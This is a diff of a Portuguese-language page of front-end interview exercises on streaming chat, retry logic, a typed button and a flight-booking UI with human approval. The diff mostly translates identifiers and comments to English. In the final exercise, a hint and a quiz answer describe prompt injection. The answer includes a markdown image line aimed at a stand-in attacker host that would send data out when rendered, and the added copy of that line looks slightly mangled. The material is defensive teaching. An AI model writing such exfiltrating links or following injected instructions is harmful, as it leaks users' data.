@@ -170,21 +170,21 @@
     body: JSON.stringify({ prompt }),
     signal,
   });
-  if (!res.ok || !res.body) throw new Error(`Falha HTTP ${res.status}`);
+  if (!res.ok || !res.body) throw new Error(`HTTP error ${res.status}`);
 
   const reader = res.body.getReader();
   const decoder = new TextDecoder();
   let buffer = '';
-  let texto = '';
+  let text = '';
 
-  // processa um evento completo; devolve true quando é o [DONE]
-  function processa(evento) {
-    for (const linha of evento.split('\n')) {
-      if (!linha.startsWith('data:')) continue; // ": ping", "event:", "id:"
-      const dado = linha.slice(5).trim();
-      if (dado === '[DONE]') return true;
-      const { delta } = JSON.parse(dado);
-      texto += delta;
+  // handles one complete event; returns true on [DONE]
+  function processEvent(event) {
+    for (const line of event.split('\n')) {
+      if (!line.startsWith('data:')) continue; // ": ping", "event:", "id:"
+      const data = line.slice(5).trim();
+      if (data === '[DONE]') return true;
+      const { delta } = JSON.parse(data);
+      text += delta;
       onDelta?.(delta);
     }
     return false;
@@ -194,55 +194,55 @@
     while (true) {
       const { done, value } = await reader.read();
       buffer += done ? decoder.decode() : decoder.decode(value, { stream: true });
-      const eventos = buffer.split('\n\n');
-      buffer = eventos.pop(); // o último pode estar pela metade (ou ser só o '' depois do \n\n)
-      for (const evento of eventos) {
-        if (processa(evento)) return { texto, completo: true };
+      const events = buffer.split('\n\n');
+      buffer = events.pop(); // the last one may be half-received (or just the '' after \n\n)
+      for (const event of events) {
+        if (processEvent(event)) return { text, complete: true };
       }
-      // fechou sem [DONE]: truncada. O que sobrou no buffer é evento sem a linha em branco
-      // no fim; a spec de SSE manda descartá-lo, e processá-lo daria SyntaxError
-      if (done) return { texto, completo: false };
+      // closed without [DONE]: truncated. What is left in the buffer is an event without the
+      // trailing blank line; the SSE spec says to discard it, and parsing it would throw SyntaxError
+      if (done) return { text, complete: false };
     }
   } finally {
-    // saiu antes do fim (erro de parse, [DONE], abort): fecha a conexão de verdade
+    // left early (parse error, [DONE], abort): really close the connection
     reader.cancel().catch(() =&gt; {});
   }
 }
 </code></pre>
 <h5>Usando no botão de parar</h5>
 <pre><code>const ctrl = new AbortController();
-botaoParar.addEventListener('click', () =&gt; ctrl.abort());
+stopButton.addEventListener('click', () =&gt; ctrl.abort());
 try {
-  const { completo } = await streamChat('Explique CSP com nonce', {
+  const { complete } = await streamChat('Explique CSP com nonce', {
     signal: ctrl.signal,
-    onDelta: (d) =&gt; (saida.textContent += d),
+    onDelta: (d) =&gt; (output.textContent += d),
   });
-  if (!completo) avisar('A resposta foi interrompida.');
+  if (!complete) notify('A resposta foi interrompida.');
 } catch (e) {
-  if (e.name !== 'AbortError') throw e; // abortar é escolha do usuário, não erro
+  if (e.name !== 'AbortError') throw e; // aborting is the user's choice, not an error
 }
 </code></pre>
-<p><strong>Por que devolver <code>{ texto, completo }</code> e não só o texto:</strong> uma resposta cortada no meio parece uma resposta curta. Quem chama precisa saber a diferença pra marcar a mensagem como incompleta e oferecer &ldquo;continuar&rdquo;.</p>
+<p><strong>Por que devolver <code>{ text, complete }</code> e não só o texto:</strong> uma resposta cortada no meio parece uma resposta curta. Quem chama precisa saber a diferença pra marcar a mensagem como incompleta e oferecer &ldquo;continuar&rdquo;.</p>
 <h5>Como testar as bordas (o teste que impressiona)</h5>
-<pre><code>// corta a mesma resposta em TODOS os pontos possíveis: pega evento e UTF-8 partidos
+<pre><code>// split the same response at EVERY possible point: catches split events and split UTF-8
 const bytes = new TextEncoder().encode(
   'data: {"delta":"olá"}\n\ndata: {"delta":" ação"}\n\ndata: [DONE]\n\n',
 );
-for (let corte = 1; corte &lt; bytes.length; corte++) {
+for (let cut = 1; cut &lt; bytes.length; cut++) {
   const body = new ReadableStream({
-    start(c) { c.enqueue(bytes.slice(0, corte)); c.enqueue(bytes.slice(corte)); c.close(); },
+    start(c) { c.enqueue(bytes.slice(0, cut)); c.enqueue(bytes.slice(cut)); c.close(); },
   });
   vi.stubGlobal('fetch', async () =&gt; new Response(body));
-  expect(await streamChat('x')).toEqual({ texto: 'olá ação', completo: true });
+  expect(await streamChat('x')).toEqual({ text: 'olá ação', complete: true });
 }
 
-// o caso que o loop acima NÃO cobre: a conexão cai no meio de um evento e o stream fecha.
-// O evento cortado tem que ser descartado, não virar SyntaxError
-const cortado = new TextEncoder().encode('data: {"delta":"olá"}\n\ndata: {"del');
+// the case the loop above does NOT cover: the connection drops mid-event and the stream closes.
+// The truncated event must be discarded, not turn into a SyntaxError
+const truncated = new TextEncoder().encode('data: {"delta":"olá"}\n\ndata: {"del');
 vi.stubGlobal('fetch', async () =&gt; new Response(new ReadableStream({
-  start(c) { c.enqueue(cortado); c.close(); },
+  start(c) { c.enqueue(truncated); c.close(); },
 })));
-expect(await streamChat('x')).toEqual({ texto: 'olá', completo: false });
+expect(await streamChat('x')).toEqual({ text: 'olá', complete: false });
 </code></pre>
       </div></details>
       <div class="quiz">
@@ -271,11 +271,11 @@ expect(await streamChat('x')).toEqual({ texto: 'olá', completo: false });
     <div class="ex-body">
       <p class="ex-enunciado">&ldquo;Implemente um hook <code>useChat()</code> que guarda a conversa, envia a pergunta, mostra a resposta chegando em streaming e deixa o usuário parar e tentar de novo. Use o <code>streamChat</code> do exercício anterior.&rdquo;</p>
 <pre><code>type Status = 'ready' | 'submitted' | 'streaming' | 'error';
-type Msg = { id: string; role: 'user' | 'assistant'; text: string; incompleta?: boolean };
+type Msg = { id: string; role: 'user' | 'assistant'; text: string; incomplete?: boolean };
 
 function useChat(): {
   messages: Msg[]; status: Status; error: Error | null;
-  send(text: string): boolean; stop(): void; retry(): void; // send diz se aceitou o envio
+  send(text: string): boolean; stop(): void; retry(): void; // send tells whether it accepted the message
 };
 </code></pre>
       <h4>Requisitos</h4>
@@ -305,23 +305,23 @@ export function useChat() {
   const messagesRef = useRef(messages);
   useEffect(() =&gt; { messagesRef.current = messages; }, [messages]);
 
-  const run = useCallback(async (pergunta: string) =&gt; {
+  const run = useCallback(async (question: string) =&gt; {
     const ctrl = new AbortController();
-    ctrlRef.current = ctrl; // antes de qualquer await: bloqueia o duplo clique
+    ctrlRef.current = ctrl; // before any await: blocks the double click
     const id = crypto.randomUUID();
-    // atualiza só a mensagem DESTA requisição
+    // updates only the message of THIS request
     const patch = (fn: (m: Msg) =&gt; Msg) =&gt;
       setMessages((ms) =&gt; ms.map((m) =&gt; (m.id === id ? fn(m) : m)));
 
     setError(null);
     setStatus('submitted');
     try {
-      let primeiro = true;
-      const { completo } = await streamChat(pergunta, {
+      let first = true;
+      const { complete } = await streamChat(question, {
         signal: ctrl.signal,
         onDelta: (delta: string) =&gt; {
-          if (primeiro) {
-            primeiro = false;
+          if (first) {
+            first = false;
             setStatus('streaming');
             setMessages((ms) =&gt; [...ms, { id, role: 'assistant', text: delta }]);
           } else {
@@ -329,16 +329,16 @@ export function useChat() {
           }
         },
       });
-      if (completo) {
+      if (complete) {
         setStatus('ready');
       } else {
-        patch((m) =&gt; ({ ...m, incompleta: true }));
+        patch((m) =&gt; ({ ...m, incomplete: true }));
         setError(new Error('A resposta foi interrompida.'));
         setStatus('error');
       }
     } catch (e) {
       if (ctrl.signal.aborted) {
-        patch((m) =&gt; ({ ...m, incompleta: true })); // parar mantém o parcial
+        patch((m) =&gt; ({ ...m, incomplete: true })); // stopping keeps the partial text
         setStatus('ready');
       } else {
         setError(e as Error);
@@ -349,9 +349,9 @@ export function useChat() {
     }
   }, []);
 
-  const send = useCallback((texto: string): boolean =&gt; {
-    const t = texto.trim();
-    if (!t || ctrlRef.current) return false; // uma requisição por vez
+  const send = useCallback((text: string): boolean =&gt; {
+    const t = text.trim();
+    if (!t || ctrlRef.current) return false; // one request at a time
     setMessages((ms) =&gt; [...ms, { id: crypto.randomUUID(), role: 'user', text: t }]);
     void run(t);
     return true;
@@ -362,12 +362,12 @@ export function useChat() {
     const ms = messagesRef.current;
     const i = ms.findLastIndex((m) =&gt; m.role === 'user');
     if (i &lt; 0) return;
-    setMessages(ms.slice(0, i + 1)); // descarta a resposta que falhou ou foi cortada
+    setMessages(ms.slice(0, i + 1)); // drop the answer that failed or was cut off
     void run(ms[i].text);
   }, [run]);
 
   const stop = useCallback(() =&gt; ctrlRef.current?.abort(), []);
-  useEffect(() =&gt; () =&gt; ctrlRef.current?.abort(), []); // desmontou: cancela
+  useEffect(() =&gt; () =&gt; ctrlRef.current?.abort(), []); // unmounted: cancel
 
   return { messages, status, error, send, stop, retry };
 }
@@ -375,14 +375,14 @@ export function useChat() {
 <h5>O componente que usa</h5>
 <pre><code>function Chat() {
   const { messages, status, error, send, stop, retry } = useChat();
-  const ocupado = status === 'submitted' || status === 'streaming';
+  const busy = status === 'submitted' || status === 'streaming';
   return (
     &lt;&gt;
       &lt;ol aria-label="Conversa"&gt;
         {messages.map((m) =&gt; (
           &lt;li key={m.id} data-role={m.role}&gt;
             {m.text}
-            {m.incompleta &amp;&amp; &lt;em&gt; (interrompida)&lt;/em&gt;}
+            {m.incomplete &amp;&amp; &lt;em&gt; (interrompida)&lt;/em&gt;}
           &lt;/li&gt;
         ))}
       &lt;/ol&gt;
@@ -397,13 +397,13 @@ export function useChat() {
         onSubmit={(e) =&gt; {
           e.preventDefault();
           const form = e.currentTarget;
-          // Enter ainda submete o form durante a resposta (envio implícito): só limpa se o envio foi aceito
+          // Enter still submits the form while answering (implicit submission): only clear if accepted
           if (send(String(new FormData(form).get('q') ?? ''))) form.reset();
         }}
       &gt;
         &lt;label htmlFor="q"&gt;Sua pergunta&lt;/label&gt;
         &lt;input id="q" name="q" autoComplete="off" /&gt;
-        {ocupado
+        {busy
           ? &lt;button type="button" onClick={stop}&gt;Parar&lt;/button&gt;
           : &lt;button type="submit"&gt;Enviar&lt;/button&gt;}
       &lt;/form&gt;
@@ -448,53 +448,53 @@ export function useChat() {
         <li>Se o abort interrompe o <code>setTimeout</code> da espera (o erro clássico é o cancelamento só valer pra próxima requisição).</li>
         <li>Se você descarta o corpo da resposta antes de tentar de novo, e o que faz quando o servidor pede pra esperar mais que o teto.</li>
       </ul>
-      <details class="dica"><summary>dica 1</summary><div class="dica-body"><p>Full jitter: <code>Math.random() * Math.min(teto, base * 2 ** (tentativa - 1))</code>. Sem aleatoriedade, mil clientes que falharam juntos voltam juntos, no mesmo milissegundo, e derrubam o serviço de novo.</p></div></details>
+      <details class="dica"><summary>dica 1</summary><div class="dica-body"><p>Full jitter: <code>Math.random() * Math.min(cap, base * 2 ** (attempt - 1))</code>. Sem aleatoriedade, mil clientes que falharam juntos voltam juntos, no mesmo milissegundo, e derrubam o serviço de novo.</p></div></details>
       <details class="dica"><summary>dica 2</summary><div class="dica-body"><p>A espera cancelável é uma <code>Promise</code> que resolve no <code>setTimeout</code> e rejeita no evento <code>abort</code> do signal &mdash; e cada caminho limpa o outro.</p></div></details>
       <details class="sol"><summary>solução comentada</summary><div class="sol-body">
-<pre><code>const REPETIVEIS = new Set([408, 429, 500, 502, 503, 504]);
+<pre><code>const RETRYABLE = new Set([408, 429, 500, 502, 503, 504]);
 
-type Opcoes = { tentativas?: number; baseMs?: number; tetoMs?: number };
+type Options = { attempts?: number; baseMs?: number; capMs?: number };
 
 export async function fetchWithRetry(
   url: string,
   init: RequestInit = {},
-  { tentativas = 3, baseMs = 500, tetoMs = 8_000 }: Opcoes = {},
+  { attempts = 3, baseMs = 500, capMs = 8_000 }: Options = {},
 ): Promise&lt;Response&gt; {
-  // full jitter: espalha os clientes que falharam juntos
-  const backoff = (i: number) =&gt; Math.random() * Math.min(tetoMs, baseMs * 2 ** (i - 1));
+  // full jitter: spreads out the clients that failed together
+  const backoff = (i: number) =&gt; Math.random() * Math.min(capMs, baseMs * 2 ** (i - 1));
 
   for (let i = 1; ; i++) {
     let res: Response;
     try {
       res = await fetch(url, init);
     } catch (e) {
-      // abort do chamador nunca é repetido; erro de rede é, até esgotar
-      if (init.signal?.aborted || i &gt;= tentativas) throw e;
-      await espera(backoff(i), init.signal);
+      // an abort from the caller is never retried; a network error is, until attempts run out
+      if (init.signal?.aborted || i &gt;= attempts) throw e;
+      await sleep(backoff(i), init.signal);
       continue;
     }
 
-    if (res.ok || !REPETIVEIS.has(res.status) || i &gt;= tentativas) return res;
+    if (res.ok || !RETRYABLE.has(res.status) || i &gt;= attempts) return res;
 
-    const pedido = retryAfterMs(res.headers.get('Retry-After'));
-    // o servidor pediu mais que o teto: não adianta insistir agora.
-    // Devolve pro chamador mostrar "tente de novo em X s".
-    if (pedido !== null &amp;&amp; pedido &gt; tetoMs) return res;
+    const requested = retryAfterMs(res.headers.get('Retry-After'));
+    // the server asked for more than the cap: no point insisting now.
+    // Return it so the caller can show "try again in X s".
+    if (requested !== null &amp;&amp; requested &gt; capMs) return res;
 
-    await res.body?.cancel(); // libera a conexão antes de esperar
-    await espera(pedido ?? backoff(i), init.signal);
+    await res.body?.cancel(); // free the connection before waiting
+    await sleep(requested ?? backoff(i), init.signal);
   }
 }
 
-function retryAfterMs(valor: string | null): number | null {
-  if (!valor) return null;
-  const segundos = Number(valor);
-  if (Number.isFinite(segundos)) return Math.max(0, segundos * 1000);
-  const data = Date.parse(valor); // "Wed, 21 Oct 2026 07:28:00 GMT"
-  return Number.isNaN(data) ? null : Math.max(0, data - Date.now());
+function retryAfterMs(value: string | null): number | null {
+  if (!value) return null;
+  const seconds = Number(value);
+  if (Number.isFinite(seconds)) return Math.max(0, seconds * 1000);
+  const date = Date.parse(value); // "Wed, 21 Oct 2026 07:28:00 GMT"
+  return Number.isNaN(date) ? null : Math.max(0, date - Date.now());
 }
 
-function espera(ms: number, signal?: AbortSignal | null): Promise&lt;void&gt; {
+function sleep(ms: number, signal?: AbortSignal | null): Promise&lt;void&gt; {
   return new Promise((resolve, reject) =&gt; {
     if (signal?.aborted) return reject(signal.reason);
     const onAbort = () =&gt; { clearTimeout(t); reject(signal!.reason); };
@@ -509,7 +509,7 @@ function espera(ms: number, signal?: AbortSignal | null): Promise&lt;void&gt; {
 <p><strong>Ligação com o que você já fez:</strong> é a mesma política do <code>withRetry</code> do Gabarita (<code>src/lib/ai/retry.ts</code>), que lê o <code>retryDelay</code> do corpo do 429 do Gemini em vez do header. Na entrevista, conte as duas: &ldquo;escrevi isso em produção, e aqui está a versão genérica&rdquo;.</p>
 <h5>Teste com tempo falso</h5>
 <pre><code>vi.useFakeTimers();
-vi.spyOn(Math, 'random').mockReturnValue(1); // backoff previsível
+vi.spyOn(Math, 'random').mockReturnValue(1); // predictable backoff
 const fetchMock = vi.fn()
   .mockResolvedValueOnce(new Response(null, { status: 503 }))
   .mockResolvedValueOnce(new Response('ok', { status: 200 }));
@@ -577,7 +577,7 @@ const button = cva(
       size: { sm: 'h-8 px-3 text-sm', md: 'h-10 px-4 text-sm', lg: 'h-12 px-5 text-base' },
       iconOnly: { true: 'px-0', false: '' },
     },
-    // combinação de variantes: só ícone vira quadrado do tamanho certo
+    // variant combination: icon-only becomes a square of the right size
     compoundVariants: [
       { iconOnly: true, size: 'sm', className: 'w-8' },
       { iconOnly: true, size: 'md', className: 'w-10' },
@@ -589,9 +589,9 @@ const button = cva(
 
 type Base = Omit&lt;ComponentProps&lt;'button'&gt;, 'children'&gt; &amp;
   Omit&lt;VariantProps&lt;typeof button&gt;, 'iconOnly'&gt; &amp; { loading?: boolean };
-type ComTexto = Base &amp; { children: ReactNode; icon?: ReactNode };
-type SoIcone = Base &amp; { children?: never; icon: ReactNode; 'aria-label': string };
-export type ButtonProps = ComTexto | SoIcone;
+type WithText = Base &amp; { children: ReactNode; icon?: ReactNode };
+type IconOnly = Base &amp; { children?: never; icon: ReactNode; 'aria-label': string };
+export type ButtonProps = WithText | IconOnly;
 
 export function Button({
   intent, size, loading = false, icon, children, className, type = 'button', onClick, ...rest
@@ -604,7 +604,7 @@ export function Button({
       aria-disabled={loading || undefined}
       aria-busy={loading || undefined}
       onClick={(e) =&gt; {
-        if (loading) { e.preventDefault(); return; } // continua focável, mas não age
+        if (loading) { e.preventDefault(); return; } // still focusable, but does nothing
         onClick?.(e);
       }}
     &gt;
@@ -623,13 +623,13 @@ function Spinner() {
 }
 </code></pre>
 <h5>O contrato, provado pelo compilador</h5>
-<pre><code>&lt;Button intent="danger" onClick={excluir}&gt;Excluir&lt;/Button&gt;
-&lt;Button icon={&lt;IconeLixeira /&gt;} aria-label="Excluir questão" intent="ghost" size="sm" /&gt;
+<pre><code>&lt;Button intent="danger" onClick={handleDelete}&gt;Excluir&lt;/Button&gt;
+&lt;Button icon={&lt;TrashIcon /&gt;} aria-label="Excluir questão" intent="ghost" size="sm" /&gt;
 
-// @ts-expect-error variante que não existe
+// @ts-expect-error variant that does not exist
 &lt;Button intent="danjer"&gt;Excluir&lt;/Button&gt;
-// @ts-expect-error botão só de ícone sem nome acessível
-&lt;Button icon={&lt;IconeLixeira /&gt;} /&gt;
+// @ts-expect-error icon-only button without an accessible name
+&lt;Button icon={&lt;TrashIcon /&gt;} /&gt;
 </code></pre>
 <p><strong>Detalhes pra mencionar:</strong> no React 19, <code>ref</code> é prop comum e passa pelo <code>...rest</code> (no 18 seria <code>forwardRef</code>); <code>{...rest}</code> vem primeiro pra que <code>type</code>, <code>className</code> e <code>onClick</code> não sejam sobrescritos sem querer; e quando duas classes do Tailwind conflitam (<code>px-4</code> do tamanho e <code>px-2</code> passado por fora), quem resolve é o <code>tailwind-merge</code> num <code>cn()</code>, não a ordem no atributo.</p>
       </div></details>
@@ -654,20 +654,20 @@ function Spinner() {
   <div class="ex" id="ex5">
     <div class="ex-head"><span class="ex-n">EX 5</span><h3>Generative UI com aprovação humana</h3><span class="ex-meta">45 min &middot; React + TS &middot; R1/R6</span></div>
     <div class="ex-body">
-      <p class="ex-enunciado">&ldquo;A resposta do assistente chega como uma lista de <code>parts</code>. Renderize cada uma: texto, ferramenta rodando, resultado e erro. Temos duas ferramentas: <code>buscarVoos</code> e <code>reservarVoo</code>. Reservar cobra no cartão, então precisa da aprovação do usuário antes de executar.&rdquo;</p>
-<pre><code>type Voo = { id: string; cia: string; partida: string; preco: number };
+      <p class="ex-enunciado">&ldquo;A resposta do assistente chega como uma lista de <code>parts</code>. Renderize cada uma: texto, ferramenta rodando, resultado e erro. Temos duas ferramentas: <code>searchFlights</code> e <code>bookFlight</code>. Reservar cobra no cartão, então precisa da aprovação do usuário antes de executar.&rdquo;</p>
+<pre><code>type Flight = { id: string; airline: string; departure: string; price: number };
 
-type Estado&lt;I, O&gt; =
-  | { state: 'input-available'; input: I }                    // rodando
-  | { state: 'approval-requested'; input: I }                 // esperando o usuário
+type ToolState&lt;I, O&gt; =
+  | { state: 'input-available'; input: I }                    // running
+  | { state: 'approval-requested'; input: I }                 // waiting for the user
   | { state: 'output-available'; input: I; output: O }
   | { state: 'output-error'; input: I; errorText: string }
-  | { state: 'output-denied'; input: I };                     // usuário recusou
+  | { state: 'output-denied'; input: I };                     // the user declined
 
 type Part =
   | { type: 'text'; text: string }
-  | ({ type: 'tool-buscarVoos'; id: string } &amp; Estado&lt;{ origem: string; destino: string }, Voo[]&gt;)
-  | ({ type: 'tool-reservarVoo'; id: string } &amp; Estado&lt;{ vooId: string; passageiros: number }, { localizador: string }&gt;);
+  | ({ type: 'tool-searchFlights'; id: string } &amp; ToolState&lt;{ origin: string; destination: string }, Flight[]&gt;)
+  | ({ type: 'tool-bookFlight'; id: string } &amp; ToolState&lt;{ flightId: string; passengers: number }, { confirmationCode: string }&gt;);
 </code></pre>
       <h4>Requisitos</h4>
       <ul>
@@ -681,23 +681,23 @@ type Part =
         <li>De onde vêm os dados do cartão de aprovação: dos argumentos que o modelo escreveu ou de uma fonte confiável.</li>
         <li>Se o texto do modelo é renderizado com segurança.</li>
       </ul>
-      <details class="dica"><summary>dica 1</summary><div class="dica-body"><p><code>Extract&lt;Part, { type: 'tool-reservarVoo' }&gt;</code> dá o tipo da prop de cada componente de ferramenta. Dentro dele, um <code>switch (part.state)</code> estreita o resto.</p></div></details>
-      <details class="dica"><summary>dica 2</summary><div class="dica-body"><p>O modelo pode escrever qualquer coisa nos argumentos, inclusive um preço falso induzido por prompt injection. Mostre o voo pelo <code>vooId</code>, buscado no resultado da sua própria ferramenta de busca, e não um &ldquo;resumo&rdquo; que o modelo mandou.</p></div></details>
+      <details class="dica"><summary>dica 1</summary><div class="dica-body"><p><code>Extract&lt;Part, { type: 'tool-bookFlight' }&gt;</code> dá o tipo da prop de cada componente de ferramenta. Dentro dele, um <code>switch (part.state)</code> estreita o resto.</p></div></details>
+      <details class="dica"><summary>dica 2</summary><div class="dica-body"><p>O modelo pode escrever qualquer coisa nos argumentos, inclusive um preço falso induzido por prompt injection. Mostre o voo pelo <code>flightId</code>, buscado no resultado da sua própria ferramenta de busca, e não um &ldquo;resumo&rdquo; que o modelo mandou.</p></div></details>
       <details class="sol"><summary>solução comentada</summary><div class="sol-body">
 <pre><code>import { useId, useState } from 'react';
 
 const brl = new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' });
-const hora = new Intl.DateTimeFormat('pt-BR', { dateStyle: 'short', timeStyle: 'short' });
+const dateTime = new Intl.DateTimeFormat('pt-BR', { dateStyle: 'short', timeStyle: 'short' });
 
-export function MensagemAssistente({ parts, onAprovar }: {
+export function AssistantMessage({ parts, onApprove }: {
   parts: Part[];
-  onAprovar: (toolCallId: string, aprovado: boolean) =&gt; void;
+  onApprove: (toolCallId: string, approved: boolean) =&gt; void;
 }) {
-  // voos que a NOSSA ferramenta devolveu: fonte confiável pro cartão de aprovação
-  const voos = new Map(
+  // flights returned by OUR tool: the trusted source for the approval card
+  const flights = new Map(
     parts.flatMap((p) =&gt;
-      p.type === 'tool-buscarVoos' &amp;&amp; p.state === 'output-available'
-        ? p.output.map((v) =&gt; [v.id, v] as const)
+      p.type === 'tool-searchFlights' &amp;&amp; p.state === 'output-available'
+        ? p.output.map((f) =&gt; [f.id, f] as const)
         : [],
     ),
   );
@@ -707,13 +707,13 @@ export function MensagemAssistente({ parts, onAprovar }: {
       {parts.map((part, i) =&gt; {
         switch (part.type) {
           case 'text':
-            return &lt;Markdown key={i} texto={part.text} /&gt;; // sem HTML cru (ver follow-up)
-          case 'tool-buscarVoos':
-            return &lt;ResultadoVoos key={part.id} part={part} /&gt;;
-          case 'tool-reservarVoo':
-            return &lt;Reserva key={part.id} part={part} voo={voos.get(part.input.vooId)} onAprovar={onAprovar} /&gt;;
+            return &lt;Markdown key={i} text={part.text} /&gt;; // no raw HTML (see follow-up)
+          case 'tool-searchFlights':
+            return &lt;FlightResults key={part.id} part={part} /&gt;;
+          case 'tool-bookFlight':
+            return &lt;Booking key={part.id} part={part} flight={flights.get(part.input.flightId)} onApprove={onApprove} /&gt;;
           default:
-            // em runtime pode chegar um tipo que este front não conhece
+            // at runtime a type this front end does not know may arrive
             return &lt;p key={i} className="text-ink-soft"&gt;Este conteúdo não pode ser exibido aqui.&lt;/p&gt;;
         }
       })}
@@ -721,57 +721,57 @@ export function MensagemAssistente({ parts, onAprovar }: {
   );
 }
 
-function ResultadoVoos({ part }: { part: Extract&lt;Part, { type: 'tool-buscarVoos' }&gt; }) {
-  const rota = `${part.input.origem} → ${part.input.destino}`;
+function FlightResults({ part }: { part: Extract&lt;Part, { type: 'tool-searchFlights' }&gt; }) {
+  const route = `${part.input.origin} → ${part.input.destination}`;
   switch (part.state) {
     case 'input-available':
-      return &lt;div role="status" className="skeleton h-24"&gt;Buscando voos {rota}…&lt;/div&gt;;
+      return &lt;div role="status" className="skeleton h-24"&gt;Buscando voos {route}…&lt;/div&gt;;
     case 'output-error':
-      return &lt;p role="alert"&gt;Não consegui buscar voos {rota} agora.&lt;/p&gt;;
+      return &lt;p role="alert"&gt;Não consegui buscar voos {route} agora.&lt;/p&gt;;
     case 'output-available':
-      if (part.output.length === 0) return &lt;p&gt;Nenhum voo encontrado {rota}.&lt;/p&gt;;
+      if (part.output.length === 0) return &lt;p&gt;Nenhum voo encontrado {route}.&lt;/p&gt;;
       return (
-        &lt;ul aria-label={`Voos ${rota}`}&gt;
-          {part.output.map((v) =&gt; (
-            &lt;li key={v.id}&gt;{v.cia} · {hora.format(new Date(v.partida))} · {brl.format(v.preco)}&lt;/li&gt;
+        &lt;ul aria-label={`Voos ${route}`}&gt;
+          {part.output.map((f) =&gt; (
+            &lt;li key={f.id}&gt;{f.airline} · {dateTime.format(new Date(f.departure))} · {brl.format(f.price)}&lt;/li&gt;
           ))}
         &lt;/ul&gt;
       );
     default:
-      return null; // busca não pede aprovação
+      return null; // search does not ask for approval
   }
 }
 
-function Reserva({ part, voo, onAprovar }: {
-  part: Extract&lt;Part, { type: 'tool-reservarVoo' }&gt;;
-  voo: Voo | undefined;
-  onAprovar: (toolCallId: string, aprovado: boolean) =&gt; void;
+function Booking({ part, flight, onApprove }: {
+  part: Extract&lt;Part, { type: 'tool-bookFlight' }&gt;;
+  flight: Flight | undefined;
+  onApprove: (toolCallId: string, approved: boolean) =&gt; void;
 }) {
-  const [respondido, setRespondido] = useState(false);
-  const tituloId = useId();
-  const responder = (ok: boolean) =&gt; { setRespondido(true); onAprovar(part.id, ok); };
+  const [answered, setAnswered] = useState(false);
+  const titleId = useId();
+  const respond = (ok: boolean) =&gt; { setAnswered(true); onApprove(part.id, ok); };
 
   switch (part.state) {
     case 'approval-requested':
       return (
-        &lt;section role="group" aria-labelledby={tituloId} className="card"&gt;
-          &lt;h4 id={tituloId}&gt;Confirmar a reserva?&lt;/h4&gt;
-          {voo ? (
+        &lt;section role="group" aria-labelledby={titleId} className="card"&gt;
+          &lt;h4 id={titleId}&gt;Confirmar a reserva?&lt;/h4&gt;
+          {flight ? (
             &lt;p&gt;
-              {voo.cia}, {hora.format(new Date(voo.partida))}, {part.input.passageiros} passageiro(s):{' '}
-              &lt;strong&gt;{brl.format(voo.preco * part.input.passageiros)}&lt;/strong&gt; no cartão salvo.
+              {flight.airline}, {dateTime.format(new Date(flight.departure))}, {part.input.passengers} passageiro(s):{' '}
+              &lt;strong&gt;{brl.format(flight.price * part.input.passengers)}&lt;/strong&gt; no cartão salvo.
             &lt;/p&gt;
           ) : (
             &lt;p role="alert"&gt;Não encontrei esse voo nos resultados da busca. Não confirme sem conferir.&lt;/p&gt;
           )}
-          &lt;button type="button" disabled={respondido || !voo} onClick={() =&gt; responder(true)}&gt;Reservar&lt;/button&gt;
-          &lt;button type="button" disabled={respondido} onClick={() =&gt; responder(false)}&gt;Não reservar&lt;/button&gt;
+          &lt;button type="button" disabled={answered || !flight} onClick={() =&gt; respond(true)}&gt;Reservar&lt;/button&gt;
+          &lt;button type="button" disabled={answered} onClick={() =&gt; respond(false)}&gt;Não reservar&lt;/button&gt;
         &lt;/section&gt;
       );
     case 'input-available':
       return &lt;p role="status"&gt;Reservando…&lt;/p&gt;;
     case 'output-available':
-      return &lt;p role="status"&gt;Reserva feita. Localizador &lt;strong&gt;{part.output.localizador}&lt;/strong&gt;.&lt;/p&gt;;
+      return &lt;p role="status"&gt;Reserva feita. Localizador &lt;strong&gt;{part.output.confirmationCode}&lt;/strong&gt;.&lt;/p&gt;;
     case 'output-denied':
       return &lt;p&gt;Reserva não feita: você recusou.&lt;/p&gt;;
     case 'output-error':
@@ -785,10 +785,10 @@ function Reserva({ part, voo, onAprovar }: {
         <div class="quiz-head">Perguntas que vêm depois</div>
         <ol>
           <li>A aprovação está no front. Isso basta pra impedir uma reserva não autorizada?
-            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Não. O front <em>coleta</em> a decisão; quem <em>exige</em> é o servidor: a ferramenta <code>reservarVoo</code> só executa se existir uma aprovação registrada pra aquele <code>toolCallId</code>, daquele usuário. E, na execução, o servidor revalida tudo (o voo existe, o preço é o mesmo de quando o usuário aprovou). Se mudou, pede aprovação de novo. Qualquer regra que só existe no cliente pode ser pulada com uma chamada direta à API.</p></div></details>
+            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Não. O front <em>coleta</em> a decisão; quem <em>exige</em> é o servidor: a ferramenta <code>bookFlight</code> só executa se existir uma aprovação registrada pra aquele <code>toolCallId</code>, daquele usuário. E, na execução, o servidor revalida tudo (o voo existe, o preço é o mesmo de quando o usuário aprovou). Se mudou, pede aprovação de novo. Qualquer regra que só existe no cliente pode ser pulada com uma chamada direta à API.</p></div></details>
           </li>
           <li>Como o texto do modelo deve ser renderizado?
-            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Como entrada não confiável. Markdown sem HTML cru (o <code>react-markdown</code> ignora HTML por padrão; nunca <code>dangerouslySetInnerHTML</code> com saída de modelo), links com o domínio visível e <code>rel="noopener noreferrer"</code>. E <strong>imagens externas não carregam sozinhas</strong>: um prompt injection pode fazer o modelo escrever <code>![](https://atacante.com/x?dados=...)</code>, e só renderizar a imagem já manda os dados pra fora. Bloqueie, passe por proxy ou peça um clique; a CSP com <code>img-src</code> restrito é a segunda barreira.</p></div></details>
+            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Como entrada não confiável. Markdown sem HTML cru (o <code>react-markdown</code> ignora HTML por padrão; nunca <code>dangerouslySetInnerHTML</code> com saída de modelo), links com o domínio visível e <code>rel="noopener noreferrer"</code>. E <strong>imagens externas não carregam sozinhas</strong>: um prompt injection pode fazer o modelo escrever <code>![](...=https://attacker.example/x?data=...=...)</code>, e só renderizar a imagem já manda os dados pra fora. Bloqueie, passe por proxy ou peça um clique; a CSP com <code>img-src</code> restrito é a segunda barreira.</p></div></details>
           </li>
           <li>Pedir aprovação pra toda ferramenta não seria mais seguro?
